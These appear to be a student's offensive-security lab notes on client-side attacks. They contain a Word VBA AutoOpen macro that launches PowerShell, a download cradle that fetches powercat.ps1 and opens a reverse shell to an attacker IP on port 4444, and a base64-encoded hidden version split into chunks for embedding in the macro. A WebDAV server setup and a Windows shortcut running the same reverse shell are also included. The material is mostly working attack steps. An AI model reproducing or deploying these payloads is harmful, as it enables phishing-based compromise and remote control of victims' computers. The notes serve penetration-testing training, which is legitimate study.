## Using MACROS

Save the document as a .doc document (Word 97-2003 option)
navigate to macros and use the following code
one for Auto open the document, the other for Opening the document, and last to run the script that you wish the document to run


![[Pasted image 20231009101852.png]]

Sub AutoOpen()

 MyMacro

End Sub

Sub Document_Open()

 MyMacro
 
End Sub

Sub MyMacro()

 CreateObject("Wscript.Shell").Run "powershell"

End Sub ^655ce0


PowerShell download cradle and PowerCat reverse shell
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

Encode it with base64 UTF-16LE

This Loop will turn any that is on the **str** into 50 character division

EXAMPLE

str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4xODEvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMgMTkyLjE2OC40NS4xODEgLXAgNDQ0NCAtZSBwb3dlcnNoZWxs"

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"'



 
^99cc34

## CODE EXECUTION VIA WINDOWS LIBRARY FILES

we use **wsgidav and webdav** for this to connect a directory with the windows client

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

To open a port to talk to the client

**Powershell command to download Powercat shell execution**
Create a shortcut
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
powercat -c **192.168.119.3** -p 4444 -e powershell"
```

**IP YOU WISH TO CHANGE IT TO SO IT TALKS TO YOU**

MAKE SURE YOU OPEN BOTH THE HTTP SERVER PORT AND THE NC LISTENER


## Q3 (Last Capstone)

